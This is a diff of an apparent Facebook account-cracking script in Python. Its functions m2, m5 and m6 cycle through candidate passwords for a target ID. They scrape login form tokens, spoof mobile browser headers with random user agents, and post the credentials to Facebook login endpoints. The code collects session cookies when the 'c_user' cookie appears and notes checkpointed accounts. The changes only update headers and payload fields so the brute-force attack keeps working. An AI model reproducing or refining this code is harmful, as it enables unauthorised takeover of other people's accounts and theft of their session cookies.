@@ -959,44 +959,14 @@ def m2(idf,pwv):
  ses = requests.Session()
  ua = random.choice(usragent)
  ua2 = random.choice(usragent)
- for pas in pwv:
+ for pw in pwv:
   try:
-   ses.headers.update({'authority':'m.facebook.com',
-            'method': 'POST',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-encoding':'gzip, deflate, br',
-            'accept-language': 'en-US,en;q=0.9,en;q=0.8',
-            'cache-control': 'max-age=0',
-            'sec-ch-ua': '"Google Chrome";v="106", "Not)A;Brand";v="99", "Chromium";v="106"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Linux"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'})
-   free_fb = ses.get('https://m.facebook.com/') 
-   dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":idf,"pass":pas,"login":"Log In"}
+   ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
+   p = ses.get('https://m.facebook.com/') 
+   dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
    koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
    koki+=' m_pixel_ratio=2.625; wd=412x756'
-   heade={'authority':'m.facebook.com',
-            'method': 'POST',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-encoding':'gzip, deflate, br',
-            'accept-language': 'en-US,en;q=0.9,en;q=0.8',
-            'cache-control': 'max-age=0',
-            'sec-ch-ua': '"Google Chrome";v="106", "Not)A;Brand";v="99", "Chromium";v="106"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Linux"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'}
+   heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    po = ses.post('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
    if "checkpoint" in po.cookies.get_dict().keys():
         idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
@@ -1168,29 +1138,16 @@ def m5(idf,pwv):
    session = requests.Session()
    pro = random.choice(ugen)
    free_fb = session.get(f'https://m.facebook.com').text
-   log_data ={'m_ts': re.search('name="m_ts" value="(.*?)"',str(free_fb.text)).group(1),
-   'li': re.search('name="li" value="(.*?)"',str(free_fb.text)).group(1),
-   'try_number': re.search('name="try_number" value="(.*?)"',str(free_fb.text)).group(1),
-   'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(free_fb.text)).group(1),
-   'email': idf,
-   'prefill_contact_point': idf,
-   'prefill_source': 'browser_onload',
-   'prefill_type': 'contact_point',
-   'first_prefill_source': 'browser_dropdown',
-   'first_prefill_type': 'contact_point',
-   'had_cp_prefilled': 'true',
-   'had_password_prefilled': 'false',
-   'is_smart_lock': 'false',
-   'bi_xrwh': '0',
-   'encpass': '#PWD_BROWSER:5:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(free_fb.text)).group(1),ps),
-   'fb_dtsg': '',
-   'jazoest': re.search('name="jazoest" value="(.*?)"',str(free_fb.text)).group(1),
-   'lsd': re.search('name="lsd" value="(.*?)"',str(free_fb.text)).group(1),
-   '__dyn': '',
-   '__csr': '',
-   '__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),
-   '__a': '',
-   '__user':0}
+   log_data = {
+    "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+   "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+   "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+   "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+   "try_number":"0",
+   "unrecognized_tries":"0",
+   "email":idf,
+   "pass":ps,
+   "login":"Log In"}
    header_freefb = {'authority':'m.facebook.com',
             'method': 'POST',
             'scheme': 'https',
@@ -1255,13 +1212,17 @@ def m6(idf,pwv):
             #sys.stdout.write(f'\r     {K}[{H}{animasi}{P}/{A}%s{K}]{N}OK{B}>{H}%s'%(loop,len(ok))),
             #sys.stdout.flush()
    pro = random.choice(ugen)
-   free_fb = session.get('https://m.facebook.com').text
-   log_data = {'jazoest': re.search('name="jazoest" value="(.*?)"',str(free_fb.text)).group(1),
-            'lsd': re.search('name="lsd" value="(.*?)"',str(free_fb.text)).group(1),
-            'email': idf,
-            'login_source': 'comet_headerless_login',
-            'next': '',
-            'encpass': '#PWD_BROWSER:5:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(free_fb.text)).group(1),ps),}
+   free_fb = session.get('https://www.facebook.com').text
+   log_data = {
+             "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":idf,
+            "pass":ps,
+            "login":"Log In"}
    header_freefb = {
             'authority': 'm.facebook.com',
             'method': 'GET',
@@ -1279,7 +1240,7 @@ def m6(idf,pwv):
             'sec-fetch-site': 'same-origin',
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'}
-   lo = session.post('https://m.facebook.com/login/device-based/login/async/?',data=log_data,headers=header_freefb).text
+   lo = session.post('https://m.facebook.com/login/device-based/login/async/',headers=header_freefb,data=log_data).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
